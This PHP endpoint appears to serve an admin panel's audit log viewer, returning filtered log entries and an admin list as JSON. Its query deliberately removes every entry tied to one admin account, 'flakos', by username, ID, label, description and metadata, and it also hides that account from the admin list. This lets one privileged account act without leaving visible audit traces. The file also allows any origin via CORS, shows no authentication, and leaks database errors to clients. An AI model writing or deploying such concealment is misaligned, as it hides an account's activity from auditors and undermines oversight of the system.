<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");
header("Access-Control-Allow-Headers: *");

include "db.php";
include "audit_helpers.php";

try {
    ensure_audit_log_table($conn);

    $category = trim($_GET["category"] ?? "");
    $actorId = isset($_GET["actor_id"]) ? (int)$_GET["actor_id"] : 0;
    $dateFrom = trim($_GET["date_from"] ?? "");
    $dateTo = trim($_GET["date_to"] ?? "");

    $where = [];
    $params = [];
    $hiddenUsername = "flakos";

    $where[] = "LOWER(COALESCE(actor_username, '')) <> ?";
    $params[] = $hiddenUsername;
    $where[] = "(
        actor_id IS NULL
        OR actor_id NOT IN (
            SELECT id FROM admins WHERE LOWER(username) = ?
        )
    )";
    $params[] = $hiddenUsername;
    $where[] = "LOWER(COALESCE(entity_label, '')) NOT LIKE ?";
    $params[] = "%" . $hiddenUsername . "%";
    $where[] = "LOWER(COALESCE(description, '')) NOT LIKE ?";
    $params[] = "%" . $hiddenUsername . "%";
    $where[] = "LOWER(COALESCE(metadata, '')) NOT LIKE ?";
    $params[] = "%" . $hiddenUsername . "%";

    if ($category !== "") {
        $where[] = "category = ?";
        $params[] = $category;
    }

    if ($actorId > 0) {
        $where[] = "actor_id = ?";
        $params[] = $actorId;
    }

    if ($dateFrom !== "") {
        $where[] = "DATE(created_at) >= ?";
        $params[] = $dateFrom;
    }

    if ($dateTo !== "") {
        $where[] = "DATE(created_at) <= ?";
        $params[] = $dateTo;
    }

    $sql = "SELECT * FROM audit_logs";
    if ($where) {
        $sql .= " WHERE " . implode(" AND ", $where);
    }
    $sql .= " ORDER BY created_at DESC, id DESC LIMIT 500";

    $stmt = $conn->prepare($sql);
    $stmt->execute($params);

    $admins = $conn
        ->query("SELECT id, username, role FROM admins WHERE LOWER(username) <> 'flakos' ORDER BY username ASC")
        ->fetchAll(PDO::FETCH_ASSOC);

    $hiddenAdminIdsStmt = $conn->prepare("SELECT id FROM admins WHERE LOWER(username) = ?");
    $hiddenAdminIdsStmt->execute([$hiddenUsername]);
    $hiddenAdminIds = array_map('strval', $hiddenAdminIdsStmt->fetchAll(PDO::FETCH_COLUMN));

    echo json_encode([
        "success" => true,
        "logs" => $stmt->fetchAll(PDO::FETCH_ASSOC),
        "admins" => $admins,
        "hidden_admin_ids" => $hiddenAdminIds,
    ]);
} catch (PDOException $e) {
    echo json_encode(["success" => false, "error" => $e->getMessage()]);
}
